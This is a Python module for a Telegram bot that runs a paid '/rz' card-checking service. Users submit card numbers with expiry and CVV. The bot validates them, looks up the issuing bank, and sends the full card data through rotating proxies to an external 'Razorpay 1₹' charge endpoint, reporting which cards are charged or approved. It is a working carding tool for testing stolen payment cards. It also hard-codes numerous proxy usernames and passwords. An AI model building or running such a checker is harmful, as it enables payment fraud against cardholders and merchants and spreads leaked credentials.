from live_emoji import plan_badge, dev_badge
import asyncio
import re
import logging
import time
import psycopg2.extras
import random
import aiohttp
from html import escape
from typing import Optional, Dict, Any

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramForbiddenError, TelegramBadRequest

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from database import is_gate_enabled, get_user_credits, update_credits, get_db_connection
from bin import get_bin_info
from sub import get_premium_status

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PROXIES = [
    "http://purevpn0s8732217:i67s60ep@px051005.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-mel.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@at-wie.pvdata.host:8080",
    "http://OR1673915314:LMf4JcDV@208.196.99.128:8813",
    "http://naveed:Qwerty_123ABC@196.244.48.124:12345",
    "http://purevpn0s12153504:1LTpwxbCJbEdXo@px043006.pointtoserver.com:10780",
    "http://purevpn0s12153504:1LTpwxbCJbEdXo@px340403.pointtoserver.com:10780",
    "http://purevpn0s12153504:1LTpwxbCJbEdXo@px490402.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@mx-mex.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@za-joh.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-bri.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-syd.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@se-got.pvdata.host:8080",
    "http://retproxy:h=dkUgsiy=6grDQC@proxy.rendimentoetico.it:31280",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@nl-ams.pvdata.host:8080",
    "http://purevpn0s12153504:1LTpwxbCJbEdXo@px041202.pointtoserver.com:10780"
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GIF REACTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

REACTIONS = [
    "airkiss", "blush", "brofist", "celebrate", "cheers", "clap",
    "cool", "cuddle", "dance", "handhold", "happy", "hug",
    "kiss", "laugh", "lick", "love", "nervous", "nom",
    "nuzzle", "nyah", "pat", "peek", "shy", "sip",
    "sleep", "smile", "smug", "sorry", "thumbsup",
    "tickle", "tired", "wave", "wink", "yay", "yes"
]

async def get_anime_gif():
    """Fetches a random anime reaction GIF from otakugifs API."""
    reaction = random.choice(REACTIONS)
    api_url = f"https://api.otakugifs.xyz/gif?reaction={reaction}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data.get("url")
    except Exception as e:
        logging.error(f"Error fetching anime gif: {e}")
    return "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3Z6eXF6eXF6eXF6eXF6eXF6eXF6eXF6SZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LdOyjZ7hx5S3yCjQ8I/giphy.gif"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION & EMOJI IDs
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Custom Emoji IDs
CUSTOM_CHARGED_EMOJI_ID = "4956719506027185156"
CUSTOM_APPROVED_EMOJI_ID = "4958610528588008305"
CUSTOM_DECLINED_EMOJI_ID = "4956612582816351459"

# In-memory dictionary for rate limiting
user_last_command_time = {}

# Router for this module
router = Router()

# API Endpoint
API_ENDPOINT = "http://93.127.132.187:7070/razorpay?cc={formatted_cc}&proxy=http://6604:1mgybORytU2Y@p105.instantproxies.com:9278"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DATABASE INITIALIZATION (Ensure columns exist)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def ensure_stats_columns():
    """Ensures cc_checked and cc_charged columns exist in the users table."""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cc_checked INTEGER DEFAULT 0")
        except Exception:
            pass 
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cc_charged INTEGER DEFAULT 0")
        except Exception:
            pass
        conn.commit()
        conn.close()
        print("[DB] RZ Stats columns checked/created.")
    except Exception as e:
        print(f"[DB] Error checking stats columns: {e}")

# Run this once when script loads
ensure_stats_columns()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def update_user_stats(user_id, is_charged):
    """
    Synchronous helper to increment stats.
    Wrapped in asyncio.to_thread when called.
    """
    def _sync_update():
        conn = get_db_connection()
        cursor = conn.cursor()
        
        # Always increment total checked
        cursor.execute("UPDATE users SET cc_checked = cc_checked + 1 WHERE user_id = %s", (user_id,))
        
        # If it was a hit (charged/approved), increment charged count
        if is_charged:
            cursor.execute("UPDATE users SET cc_charged = cc_charged + 1 WHERE user_id = %s", (user_id,))
            
        conn.commit()
        conn.close()

    await asyncio.to_thread(_sync_update)

async def get_user_plan_name(user_id):
    """Fetches specific plan name from receipts if premium, else Trial."""
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    
    if is_premium:
        try:
            def _sync_fetch():
                conn = get_db_connection()
                cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
                # Get the latest plan purchased
                cursor.execute("SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1", (user_id,))
                row = cursor.fetchone()
                conn.close()
                return row['plan'].upper() if row else "PREMIUM"
            return await asyncio.to_thread(_sync_fetch)
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "PREMIUM"
    else:
        return "FREE"

def luhn_check(card_number: str) -> bool:
    """
    Validates a credit card number using Luhn Algorithm.
    Returns True if valid, False otherwise.
    """
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    
    total = 0
    reverse_digits = card_number[::-1]
    
    for i, char in enumerate(reverse_digits):
        digit = int(char)
        
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
        
    return total % 10 == 0

def is_india_card(bin_info: dict) -> bool:
    """
    Checks if the card is from India based on BIN info.
    Checks both country name and country code.
    """
    country_name = bin_info.get("country", "").lower()
    country_code = bin_info.get("country_code", "").upper()
    
    # Check country name contains "india"
    if "india" in country_name:
        return True
    
    # Check country code is "IN" (India's ISO code)
    if country_code == "IN":
        return True
    
    return False

def build_user_link(user_obj) -> str:
    """Builds a clickable user mention link."""
    name = escape(user_obj.first_name or "User")
    if user_obj.username:
        return f'<a href="https://t.me/{escape(user_obj.username)}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'

def get_random_proxy() -> str:
    """Returns a random proxy from the proxy list."""
    return random.choice(PROXIES)

async def check_card_via_api(formatted_cc: str, proxy: str) -> Dict[str, Any]:
    """
    Checks card via the API endpoint.
    Returns the API response as dictionary.
    """
    # Build the API URL
    api_url = API_ENDPOINT.format(formatted_cc=formatted_cc)
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=60) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data
                else:
                    return {
                        "payment_id": "N/A",
                        "proxy": "Rotated",
                        "response": f"API Error: HTTP {resp.status}",
                        "status": "error"
                    }
    except asyncio.TimeoutError:
        return {
            "payment_id": "N/A",
            "proxy": "Rotated",
            "response": "Connection timed out",
            "status": "error"
        }
    except Exception as e:
        logging.error(f"API request error: {e}")
        return {
            "payment_id": "N/A",
            "proxy": "Rotated",
            "response": str(e),
            "status": "error"
        }

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/rz"))
async def rz_command(message: types.Message):
    # 1. GATE CHECK
    if not await asyncio.to_thread(is_gate_enabled, "rz"):
        await message.reply(
            "🚧 <b>𝗥𝗮𝘇𝗼𝗿𝗽𝗮𝘆 𝟭₹ 𝗚𝗮𝘁𝗲 𝗶𝘀 𝘂𝗻𝗱𝗲𝗿 𝗺𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>\n"
            "𝗜𝘁 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗯𝗮𝗰𝗸 𝘀𝗵𝗼𝗿𝘁𝗹𝘆 𝘄𝗶𝘁𝗵 𝗲𝘅𝗰𝗶𝘁𝗶𝗻𝗴 𝗶𝗺𝗽𝗿𝗼𝘃𝗲𝗺𝗲𝗻𝘁𝘀.⚙️",
            parse_mode="HTML"
        )
        return

    user = message.from_user
    user_id = user.id
    current_time = time.time()

    # 2. GET PREMIUM STATUS
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)

    # 3. RATE LIMITING CHECK
    if not is_premium:
        # Apply 10s cooldown only to FREE users
        if user_id in user_last_command_time:
            elapsed = current_time - user_last_command_time[user_id]
            if elapsed < 10:
                remaining_time = round(10 - elapsed, 1)
                await message.reply(
                    f"<tg-emoji emoji-id=\"6255910249362885846\">⚠️</tg-emoji> <b>𝗔𝗰𝘁𝗶𝘃𝗲 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻 !</b>\n\n"
                    f"𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 <code>{remaining_time}</code> 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗶𝗻𝗴.\n\n"
                    f"<tg-emoji emoji-id=\"6136275172283391020\">⭐</tg-emoji> 𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝗽𝗹𝗮𝗻 𝗳𝗼𝗿 𝘂𝘀𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝘄𝗶𝘁𝗵𝗼𝘂𝘁 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻.",
                    parse_mode="HTML"
                )
                return
        
        user_last_command_time[user_id] = current_time
    
    # 4. Extract Card Details
    parts = message.text.split(maxsplit=1)
    raw_text = ""
    
    if len(parts) > 1:
        raw_text = parts[1].strip()

    if message.reply_to_message:
        raw_text += " " + (message.reply_to_message.text or message.reply_to_message.caption or "")
        
    if not raw_text.strip():
        await message.reply(
            "❌ <b>Usage:</b> /rz <code>cc|mm|yy|cvv</code>\n"
            "Or reply to a message containing card details.",
            parse_mode="HTML"
        )
        return

    # Regex to find CC (Supports 15-16 digits for AMEX/Visa/MC)
    pattern = r'\b(\d{15,16})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{3,4})\b'
    match = re.search(pattern, raw_text)

    if not match:
        await message.reply(
            "❌ <b>Invalid Card Format.</b>\n"
            "Please provide CC as <code>4242424242424242|05|27|123</code>",
            parse_mode="HTML"
        )
        return

    cc, mm, yy_raw, cvv = match.groups()

    # Normalize Year
    if len(yy_raw) == 4:
        yy = yy_raw[2:]
    else:
        yy = yy_raw

    formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"

    # 5. LUHN CHECK
    if not luhn_check(cc):
        await message.reply(
            "❌ <b>Invalid Card</b>\n"
            "Your card number is incorrect.",
            parse_mode="HTML"
        )
        return

    # 6. Check Credits (APPLIED TO EVERYONE)
    current_credits = await asyncio.to_thread(get_user_credits, user_id)
    if current_credits is None or current_credits <= 0:
        await message.reply(
            "❌ <b>Insufficient Credits!</b>\n\n"
            "You have 0 credits left.",
            parse_mode="HTML"
        )
        return

    # 7. Fetch Plan Name
    plan_name = await get_user_plan_name(user_id)

    # 8. Send Processing Message (as reply)
    escaped_card = escape(formatted_cc)
    proc_msg = await message.reply(
        f"<pre><code>𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜⏳...</code></pre>\n"
        f"<pre><code>{escaped_card}</code></pre>\n"
        f"<b>𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➠ 𝙍𝙖𝙯𝙤𝙧𝙥𝙖𝙮 𝟭₹</b>\n",
        parse_mode="HTML"
    )

    # 9. Execute Background Task
    asyncio.create_task(
        process_rz_check(
            message, proc_msg, user, user_id, formatted_cc, cc, plan_name
        )
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND PROCESSOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_rz_check(message, proc_msg, user, user_id, formatted_cc, cc, plan_name):
    """
    Handles gate check, DB updates, and final message editing.
    Optimized for faster response times.
    """
    
    check_started = time.time()
    start_time = time.time()
    
    # Initialize variables
    api_result = {}
    bin_info = {}
    gate_status = "error"
    response_message = "Unknown Error"
    is_charged = False
    
    # First, get BIN info to check if it's India
    async def run_bin_lookup():
        nonlocal bin_info
        try:
            bin_info = await get_bin_info(cc[:6])
        except Exception:
            bin_info = {}
    
    await run_bin_lookup()
    
    # Prepare BIN data
    bin_scheme = bin_info.get("scheme", "N/A")
    bin_bank = bin_info.get("bank", "N/A")
    
    # Prepare Country with Flag
    country_name = bin_info.get("country", "N/A")
    country_flag = bin_info.get("country_emoji", "")
    bin_country = f"{country_name} {country_flag}" if country_flag else country_name
    type = bin_info.get("type") or "N/A"
    
    # ═══════════════════════════════════════════════════════
    # INDIA CARD CHECK - Skip gate, direct region block
    # ═══════════════════════════════════════════════════════
    if is_india_card(bin_info):
        gate_status = "declined"
        response_message = "[RISK_CONTROL] / REGION_BLOCKED"
        api_result = {
            "status": False,
            "message": response_message,
            "details": {"gate_status": "declined"}
        }
        logging.info(f"India card blocked: {cc[:6]} for user {user_id}")
    else:
        # ═══════════════════════════════════════════════════════
        # NON-INDIA CARD - Proceed with actual gate check using API
        # ═══════════════════════════════════════════════════════
        
        # Get a random proxy
        selected_proxy = get_random_proxy()
        
        async def run_api_check():
            nonlocal api_result
            api_result = await check_card_via_api(formatted_cc, selected_proxy)
        
        await run_api_check()
        
        # Extract gate_status from API response
        # API returns: {"payment_id": "...", "proxy": "...", "response": "...", "status": "..."}
        gate_status = str(api_result.get("status", "error")).lower()
        response_message = api_result.get("response", "Unknown Error")
        
        # If gate_status is empty or unrecognised, treat as error
        if gate_status not in ("charged", "approved", "declined"):
            gate_status = "error"
            if not response_message or response_message == "Unknown Error":
                response_message = "Payment declined"

    # Determine Final Status Display based on gate_status
    if gate_status == "charged":
        final_status = f'𝗖𝗛𝗔𝗥𝗚𝗘𝗗 <tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">💎</tg-emoji>'
        is_charged = True
    elif gate_status == "approved":
        final_status = f'𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 <tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji>'
        is_charged = True 
    elif gate_status == "declined":
        final_status = f'𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 <tg-emoji emoji-id="{CUSTOM_DECLINED_EMOJI_ID}">❌</tg-emoji>'
    else:
        final_status = "𝗘𝗥𝗥𝗢𝗥 ⚠️"

    # UPDATED CREDIT DEDUCTION LOGIC (Applies to everyone)
    credits_to_deduct = 0
    
    if gate_status == 'charged':
        credits_to_deduct = 2
    elif gate_status == 'approved':
        credits_to_deduct = 1
    elif gate_status == 'declined':
        credits_to_deduct = 1
    # Else (Error/Timeout) -> 0 credits

    # Fetch fresh balance and deduct
    if credits_to_deduct > 0:
        current_balance = await asyncio.to_thread(get_user_credits, user_id)
        new_balance = current_balance - credits_to_deduct
        if new_balance < 0: new_balance = 0
        await asyncio.to_thread(update_credits, user_id, new_balance)

    # UPDATE STATS (Checked + Charged)
    await update_user_stats(user_id, is_charged)

    # Build Final Caption
    user_link = build_user_link(user)
    dev_link = dev_badge()
    
    user_display = f"{user_link} {plan_badge(plan_name)}"
    
    elapsed = time.time() - start_time
    
    elapsed = time.time() - check_started
    final_caption = (
        f'<b><a href="https://t.me/broken_wiz">[⌭]</a> Sᴛᴀᴛᴜs ➵ {final_status}</b>\n'
        f"<tg-emoji emoji-id=\"5920055227133725805\">💳</tg-emoji>\n"
        f"⤷ <code>{formatted_cc}</code>\n"
        f"━━━━━━━━━━━\n"
        f'<b><a href="https://t.me/broken_wiz">⬢</a> Gᴀᴛᴇ ➵ 𝗥𝗮𝘇𝗼𝗿𝗽𝗮𝘆 𝟭₹</b>\n'
        f'<b><a href="https://t.me/broken_wiz">⬡</a> Rᴀᴡ ➵ {response_message}</b>\n'
        f"━━━━━━━━━━━\n"
        f"<b>Tʏᴘᴇ ➵</b> <code>[ {type} ]</code>\n"
        f"<b>Iɴꜰᴏ ➵</b> <code>{bin_scheme} - {bin_bank} - {bin_country}</code>\n"
        f"━━━━━━━━━━━\n"
        f"<tg-emoji emoji-id=\"5440621591387980068\">🔜</tg-emoji> <b>➵ {elapsed:.2f}s</b>\n"
        f"<tg-emoji emoji-id=\"6028240037366207289\">👤</tg-emoji> <b>➵ {user_display}</b>\n"
        f"<tg-emoji emoji-id=\"5429615084856969948\">🏴‍☠️</tg-emoji> <b>➵ {dev_link}</b>"
    )

    # G. FETCH ANIME GIF
    gif_url = await get_anime_gif()

    # H. Send as Animation (GIF) with Caption
    try:
        # Try to delete the processing message first
        try:
            await proc_msg.delete()
        except Exception:
            pass
        
        # Send as animation with GIF
        await message.reply_animation(
            animation=gif_url,
            caption=final_caption,
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    except (TelegramForbiddenError, TelegramBadRequest) as e:
        # Fallback to editing the processing message if GIF sending fails
        logging.warning(f"[RZ] Could not send GIF, falling back to text: {e}")
        try:
            await proc_msg.edit_text(
                text=final_caption,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception as edit_err:
            logging.error(f"Error editing message: {edit_err}")
            await message.reply(
                text=final_caption,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
    except Exception as e:
        # Ultimate fallback - just edit the processing message
        logging.error(f"Error sending result: {e}")
        try:
            await proc_msg.edit_text(
                text=final_caption,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception:
            await message.reply(
                text=final_caption,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
    
    # Log timing
    logging.info(f"RZ command completed in {elapsed:.2f}s for user {user_id}")
